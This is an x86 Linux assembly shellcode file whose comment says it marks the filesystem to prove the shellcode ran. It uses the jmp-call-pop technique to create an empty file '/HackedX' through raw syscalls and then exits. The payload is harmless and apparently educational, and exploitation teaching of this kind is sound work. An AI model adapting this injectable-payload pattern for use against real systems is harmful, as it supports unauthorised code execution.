BITS 32

; Mark filesystem to prove shellcode ran
jmp short one   ;
two:
pop  ebx                ; Filename
xor  ecx,ecx            ; zero out ECX
mov  BYTE [ebx+7],cl    ; null terminate the filename
push BYTE 0x5           ; open() - syscall
pop  eax                ; put 5 in EAX
mov  WORD cx,0x441      ; 0_WRONLY|O_APPEND|O_CREAT
xor  edx,edx            ; zero out EDX
mov  WORD dx,0x180      ; S_IRUSR|S_IW_USR
int  0x80               ; Open file

; EAX = returned fd
mov  ebx,eax            ; fd in second arg
push BYTE 0x6           ; close() - syscall
pop  eax                ; put in EAX
int  0x80               ; Close file

xor  eax,eax            ; zero out EAX
mov  ebx,eax            ; put 0 in EBX arg
inc  eax                ; exit syscall
int  0x80               ; exit(0) to avoid infinite loop

one:
call  two               ;
db    "/HackedX"
;
